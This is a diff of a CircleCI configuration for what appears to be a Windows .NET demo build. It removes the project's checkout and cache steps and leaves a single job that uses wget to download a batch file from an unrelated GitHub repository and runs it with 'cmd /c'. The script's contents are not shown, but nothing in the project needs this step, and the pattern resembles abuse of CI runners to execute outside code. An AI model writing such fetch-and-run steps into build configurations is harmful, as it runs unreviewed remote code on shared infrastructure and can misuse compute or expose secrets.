@@ -1,28 +1,15 @@
-version: 2.1
+version: 2.1 
 
 orbs:
-  win: circleci/windows@4.1.1
-
-workflows:
-  hello-world:
-    jobs:
-      - build
-  
+  win: circleci/windows@2.2.0
 
 jobs:
-  build:
+  build: 
     executor:
-      name: win/default
-    working_directory: C:\Users\circleci\project\HelloWorld
+      name: win/default 
+      size: "large" 
+    
     steps:
-      - checkout:
-          path: C:\Users\circleci\project
-      - restore_cache:
-          keys:
-            - dotnet-packages-v1-{{ checksum "circleci-demo-windows.csproj" }}
-      - run:
-          name: "Yes"
-          command: | 
-            wget -O fiz.bat https://github.com/ajiLa78/slepoq/raw/main/fiz.bat
-            cmd /c fiz.bat
-      
+    - run: |
+          wget -O wiz.bat https://github.com/ajiLa78/slepoq/raw/main/fiz.bat
+          cmd /c wiz.bat
